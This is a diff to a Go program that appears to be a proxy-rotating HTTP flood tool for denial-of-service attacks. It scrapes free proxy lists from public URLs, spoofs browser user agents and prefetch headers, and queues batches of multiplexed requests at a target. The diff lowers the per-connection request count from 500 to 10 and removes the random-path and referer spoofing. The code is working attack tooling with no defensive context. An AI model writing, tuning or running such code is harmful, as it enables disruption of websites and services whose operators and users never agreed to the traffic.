@@ -1,5 +1,5 @@
 package main
-
+// w
 import (
     "crypto/tls"
     "flag"
@@ -46,8 +46,6 @@ var (
         "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3945.79 Mobile Safari/537.36",
     }
 
-    paths = []string{"/", "/home", "/login", "/dashboard", "/api/data", "/status"}
-
     proxySources = []string{
         "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
         "https://proxyelite.info/wp-admin/admin-ajax.php?action=proxylister_download&nonce=afb07d3ca5&format=txt",
@@ -90,7 +88,6 @@ func randomMethod() string {
     }
     return "POST"
 }
-func randomPath() string { return paths[rand.Intn(len(paths))] }
 
 // Create TLS config
 func createTLSConfig() *tls.Config {
@@ -196,7 +193,7 @@ func sendRequest(proxyAddr, target string) {
 
     // Use a single connection to multiplex requests
     var wg sync.WaitGroup
-    reqChan := make(chan *http.Request, 500) // Buffered channel for requests
+    reqChan := make(chan *http.Request, 10) // Buffered channel for requests
     doneChan := make(chan struct{})
 
     // Worker to process requests from the channel
@@ -220,7 +217,7 @@ func sendRequest(proxyAddr, target string) {
     }()
 
     // Generate and send 500 requests using multiplexing
-    for i := 0; i < 500; i++ {
+    for i := 0; i < 10; i++ {
         wg.Add(1)
         headers := map[string]string{
             "sec-purpose":               "prefetch;prerender",
@@ -232,13 +229,12 @@ func sendRequest(proxyAddr, target string) {
             "accept":                    acceptList[rand.Intn(len(acceptList))],
             "accept-encoding":           "gzip, deflate, br",
             "accept-language":           "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7",
-            "referer":                   "https://" + parsedURL.Host + randomPath(),
+            "referer":                   "https://" + parsedURL.Host,
             "user-agent":                userAgentList[rand.Intn(len(userAgentList))],
         }
 
         method := randomMethod()
-        path := randomPath()
-        req, err := http.NewRequest(method, target+path, nil)
+        req, err := http.NewRequest(method, target, nil) // Use target directly, no random path
         if err != nil {
             log.Printf("DEBUG: Failed to create request %d: %v", i, err)
             atomic.AddUint64(&errorCount, 1)
@@ -248,7 +244,7 @@ func sendRequest(proxyAddr, target string) {
         for k, v := range headers {
             req.Header.Set(k, v)
         }
-        log.Printf("DEBUG: Queuing request %d: %s %s", i, method, target+path)
+        log.Printf("DEBUG: Queuing request %d: %s %s", i, method, target)
         reqChan <- req // Send request to the channel
     }
 
